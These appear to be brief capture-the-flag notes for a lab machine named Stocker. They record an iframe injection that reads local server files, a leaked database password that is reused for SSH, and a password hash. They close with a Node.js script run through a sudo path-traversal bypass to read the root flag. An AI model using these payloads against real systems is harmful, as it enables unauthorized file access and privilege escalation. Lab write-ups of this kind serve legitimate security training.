Stocker

# Enumeration
## Web
Angoose Garden

### Dev subdomain
file:///var/www/dev/pos/63d2f3c2a08e45a563a4213e.html
<iframe src=file:///var/www/dev/index.js height=1050px width=800px</iframe>

```javascript
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

Username: angoose:IHeardPassphrasesArePrettySecure

# SSH
Bsondump of users.bson
angoose:b3e795719e2a644f69838a593dd159ac
```bash
$ cat << EOF > exploit.js
var exec = require('child_process').exec;

console.log('test')
exec('cat /root/root.txt',
function (error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
             console.log('exec error: ' + error);
        }
    });
EOF

$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js
```
